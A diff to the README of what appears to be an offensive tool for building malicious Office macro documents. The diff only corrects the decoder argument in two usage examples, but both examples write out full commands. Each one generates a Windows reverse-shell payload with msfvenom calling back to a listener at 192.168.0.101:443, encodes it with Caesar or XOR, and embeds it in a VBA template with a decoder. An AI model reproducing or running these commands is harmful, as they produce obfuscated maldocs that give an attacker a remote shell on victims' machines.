@@ -80,7 +80,7 @@ wsl --exec msfvenom ... -f hex | Invoke-Vulcan ...
     ```powershell
     wsl --exec msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread -f hex | `
         Invoke-Caesar -Key 5 | `
-        Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.vba" -Decoder xor -DecoderPath ".\assets\decoders\caesar.vba" -Key 5 -Verbose
+        Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.vba" -Decoder Caesar -DecoderPath ".\assets\decoders\caesar.vba" -Key 5 -Verbose
     ```
 
 - Embed a `XOR`-encoded shellcode:
@@ -88,7 +88,7 @@ wsl --exec msfvenom ... -f hex | Invoke-Vulcan ...
     ```powershell
     wsl --exec msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread -f hex | `
         Invoke-XOR -Key "StarWatchThisRepo" | `
-        Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.vba" -Decoder xor -DecoderPath ".\assets\decoders\xor.vba" -Key "StarWatchThisRepo" -Verbose
+        Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.vba" -Decoder XOR -DecoderPath ".\assets\decoders\xor.vba" -Key "StarWatchThisRepo" -Verbose
     ```
     
     https://user-images.githubusercontent.com/11601622/182009478-5e52ae7d-9bdb-44e5-bf25-06c57597d4be.mp4
